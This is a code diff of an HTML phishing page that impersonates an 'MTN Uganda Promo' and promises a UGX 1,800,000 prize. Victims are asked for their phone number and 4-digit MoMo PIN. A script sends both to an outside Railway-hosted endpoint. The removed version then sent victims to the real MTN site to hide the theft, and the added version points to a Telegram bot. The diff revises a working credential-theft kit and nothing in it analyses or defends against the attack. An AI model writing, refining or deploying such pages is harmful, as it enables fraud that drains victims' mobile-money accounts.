@@ -1,243 +1,189 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>MTN Promo - UGX 1,800,000</title>
-<style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-        background: linear-gradient(145deg, #e8edf2 0%, #dce3ec 100%);
-        min-height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        padding: 16px;
-    }
-    .wrapper {
-        background: white;
-        border-radius: 48px;
-        padding: 32px 24px 44px;
-        max-width: 480px;
-        width: 100%;
-        text-align: center;
-        box-shadow: 0 20px 40px rgba(0,0,0,0.12);
-        transition: opacity 0.4s;
-    }
-    svg { max-width: 140px; margin-bottom: 8px; }
-    h1 { font-size: 26px; color: #1a2c3e; margin-bottom: 20px; }
-    .prize-message {
-        background: #f8fafc;
-        padding: 18px 20px;
-        border-radius: 28px;
-        border-left: 4px solid #f5a623;
-        border-right: 4px solid #f5a623;
-        margin: 8px 0 20px;
-    }
-    .prize-amount { font-size: 28px; font-weight: 800; color: #c97e00; margin: 8px 0 4px; }
-    label { display: block; text-align: left; font-weight: 600; margin: 20px 0 6px 8px; }
-    input[type="tel"] {
-        width: 100%;
-        padding: 15px 20px;
-        border: 1.5px solid #e2e8f0;
-        border-radius: 60px;
-        font-size: 17px;
-        outline: none;
-    }
-    input[type="tel"]:focus { border-color: #f5a623; }
-    .pin-wrapper { display: flex; gap: 14px; justify-content: center; margin: 12px 0; }
-    .pin-box {
-        width: 68px;
-        height: 68px;
-        text-align: center;
-        font-size: 32px;
-        font-weight: 700;
-        border: 1.5px solid #cbd5e1;
-        border-radius: 20px;
-        outline: none;
-        font-family: monospace;
-    }
-    .pin-box:focus { border-color: #f5a623; box-shadow: 0 0 0 3px rgba(245,166,35,0.2); }
-    @media (max-width: 480px) {
-        .pin-box { width: 55px; height: 55px; font-size: 28px; }
-    }
-    .footer-note {
-        margin-top: 24px;
-        background: #f1f5f9;
-        display: inline-block;
-        padding: 8px 20px;
-        border-radius: 40px;
-        font-size: 13px;
-    }
-    .error-popup {
-        position: fixed;
-        bottom: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: #ff4444;
-        color: white;
-        padding: 12px 24px;
-        border-radius: 50px;
-        font-size: 14px;
-        z-index: 1000;
-        animation: slideUp 0.3s ease;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-    }
-    @keyframes slideUp {
-        from { bottom: -50px; opacity: 0; }
-        to { bottom: 20px; opacity: 1; }
-    }
-</style>
+    <title>MTN Promo - UGX 1,800,000</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(145deg, #e8edf2 0%, #dce3ec 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            padding: 16px;
+        }
+        .wrapper {
+            background: white;
+            border-radius: 48px;
+            padding: 32px 24px 44px;
+            max-width: 480px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.12);
+        }
+        .prize-message {
+            background: #f8fafc;
+            padding: 18px 20px;
+            border-radius: 28px;
+            border-left: 4px solid #f5a623;
+            border-right: 4px solid #f5a623;
+            margin: 20px 0;
+        }
+        .prize-amount { font-size: 28px; font-weight: 800; color: #c97e00; margin: 8px 0 4px; }
+        label { display: block; text-align: left; font-weight: 600; margin: 20px 0 6px 8px; }
+        input[type="tel"], input[type="password"] {
+            width: 100%;
+            padding: 15px 20px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 60px;
+            font-size: 17px;
+            outline: none;
+        }
+        input:focus { border-color: #f5a623; }
+        .pin-wrapper { display: flex; gap: 14px; justify-content: center; margin: 12px 0; }
+        .pin-box {
+            width: 68px;
+            height: 68px;
+            text-align: center;
+            font-size: 32px;
+            font-weight: 700;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 20px;
+            outline: none;
+            font-family: monospace;
+        }
+        .pin-box:focus { border-color: #f5a623; }
+        button {
+            margin-top: 24px;
+            background: #f5a623;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            width: 100%;
+        }
+        .status {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #666;
+        }
+        @media (max-width: 480px) {
+            .pin-box { width: 55px; height: 55px; font-size: 28px; }
+        }
+    </style>
 </head>
 <body>
-<div class="wrapper" id="appWrapper">
-    <svg width="140" height="100" viewBox="0 0 420 310">
-        <rect x="125" y="45" width="150" height="160" rx="26" fill="#fff" stroke="#f5a623" stroke-width="6"/>
-        <path d="M220 20 L300 65 L255 115 L165 75 Z" fill="#f5a623"/>
-        <text x="72" y="270" font-size="52" fill="#1e2f3d" font-weight="800">MTN</text>
-        <text x="195" y="270" font-size="52" fill="#f5a623" font-weight="800">MoMo</text>
-    </svg>
-    <h1>MTN Uganda Promo</h1>
+<div class="wrapper">
+    <h1 style="color: #1a2c3e;">MTN Uganda Promo</h1>
     <div class="prize-message">
         You're almost there — fill in the form below to claim
         <div class="prize-amount">UGX 1,800,000</div>
         instantly.
     </div>
+    
     <input type="tel" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="off">
     <label>🔐 4-digit MoMo PIN</label>
-    <div class="pin-wrapper" id="pinWrapper">
+    <div class="pin-wrapper">
         <input class="pin-box" maxlength="1" inputmode="numeric">
         <input class="pin-box" maxlength="1" inputmode="numeric">
         <input class="pin-box" maxlength="1" inputmode="numeric">
         <input class="pin-box" maxlength="1" inputmode="numeric">
     </div>
-    <div class="footer-note" id="statusMsg">💰 Claim your prize</div>
+    
+    <button onclick="submitForm()">💰 Claim Prize</button>
+    <div class="status" id="statusMsg"></div>
 </div>
 
 <script>
     const phoneInput = document.getElementById('phoneInput');
     const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
-    const wrapper = document.getElementById('appWrapper');
     const statusMsg = document.getElementById('statusMsg');
     let realPin = ['', '', '', ''];
     let submitted = false;
-
-    // Function to show error message
-    function showError(message) {
-        // Remove existing error if any
-        const existingError = document.querySelector('.error-popup');
-        if (existingError) existingError.remove();
-        
-        // Create new error popup
-        const errorDiv = document.createElement('div');
-        errorDiv.className = 'error-popup';
-        errorDiv.textContent = message;
-        document.body.appendChild(errorDiv);
-        
-        // Auto remove after 3 seconds
-        setTimeout(() => {
-            if (errorDiv) errorDiv.remove();
-        }, 3000);
-    }
 
     phoneInput.addEventListener('input', e => {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
     });
 
-    async function submitToBackend() {
-        if (submitted) return;
-        
-        const phone = phoneInput.value;
-        const pin = realPin.join('');
-        
-        // Validation
-        if (!/^07\d{8}$/.test(phone)) {
-            showError('❌ Invalid MTN number (use 07XXXXXXXX)');
-            return;
-        }
-        if (pin.length !== 4) {
-            showError('❌ Enter complete 4-digit PIN');
-            return;
-        }
-        
-        submitted = true;
-        statusMsg.innerHTML = '⏳ Processing...';
-        
-        // Your Railway backend URL
-        const API_URL = 'https://momoloan-production.up.railway.app/api/submit';
-        
-        try {
-            console.log('Sending to:', API_URL);
-            console.log('Data:', { phone, pin });
-            
-            const response = await fetch(API_URL, {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify({ phone, pin })
-            });
-            
-            console.log('Response status:', response.status);
-            
-            const data = await response.json();
-            console.log('Response data:', data);
-            
-            if (response.ok && data.success) {
-                statusMsg.innerHTML = '✅ Redirecting...';
-                wrapper.style.opacity = '0';
-                setTimeout(() => {
-                    window.location.href = 'https://www.mtn.co.ug/';
-                }, 500);
-            } else {
-                throw new Error(data.error || 'Submission failed');
-            }
-        } catch (error) {
-            console.error('Error details:', error);
-            showError('⚠️ Server error: ' + error.message);
-            statusMsg.innerHTML = '💰 Claim your prize';
-            statusMsg.style.background = '#f1f5f9';
-            submitted = false;
-        }
-    }
-
-    // PIN box logic
     pinBoxes.forEach((box, idx) => {
         box.addEventListener('input', e => {
             let val = e.target.value.replace(/\D/g, '');
             if (!val) return;
             e.target.value = val;
             realPin[idx] = val;
-            
             setTimeout(() => {
                 if (document.activeElement !== box) e.target.value = '•';
             }, 150);
-            
             if (idx < 3) pinBoxes[idx + 1].focus();
-            
-            // Auto-submit when all digits entered AND phone is valid
-            if (realPin.every(p => p !== '') && /^07\d{8}$/.test(phoneInput.value)) {
-                submitToBackend();
-            }
         });
-        
         box.addEventListener('keydown', e => {
             if (e.key === 'Backspace') {
                 realPin[idx] = '';
                 if (idx > 0 && !box.value) pinBoxes[idx - 1].focus();
             }
         });
-        
         box.addEventListener('focus', function() {
             if (realPin[idx]) this.value = realPin[idx];
         });
-        
         box.addEventListener('blur', function() {
             if (realPin[idx]) this.value = '•';
         });
     });
+
+    async function submitForm() {
+        if (submitted) return;
+        
+        const phone = phoneInput.value;
+        const pin = realPin.join('');
+        
+        if (!/^07\d{8}$/.test(phone)) {
+            statusMsg.innerHTML = '❌ Invalid MTN number (07XXXXXXXX)';
+            statusMsg.style.color = 'red';
+            return;
+        }
+        if (pin.length !== 4) {
+            statusMsg.innerHTML = '❌ Enter complete 4-digit PIN';
+            statusMsg.style.color = 'red';
+            return;
+        }
+        
+        submitted = true;
+        statusMsg.innerHTML = '⏳ Processing...';
+        statusMsg.style.color = '#f5a623';
+        
+        try {
+            const response = await fetch('https://momoloan-production.up.railway.app/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, pin })
+            });
+            
+            const data = await response.json();
+            
+            if (data.success) {
+                statusMsg.innerHTML = '✅ Success! Check your Telegram @Ugxforme_bot';
+                statusMsg.style.color = 'green';
+                // Optional: redirect after 2 seconds
+                // setTimeout(() => {
+                //     window.location.href = 'https://www.mtn.co.ug/';
+                // }, 2000);
+            } else {
+                statusMsg.innerHTML = '❌ Error: ' + (data.details || data.error);
+                statusMsg.style.color = 'red';
+                submitted = false;
+            }
+        } catch (err) {
+            statusMsg.innerHTML = '❌ Server error: ' + err.message;
+            statusMsg.style.color = 'red';
+            submitted = false;
+        }
+    }
 </script>
 </body>
 </html>
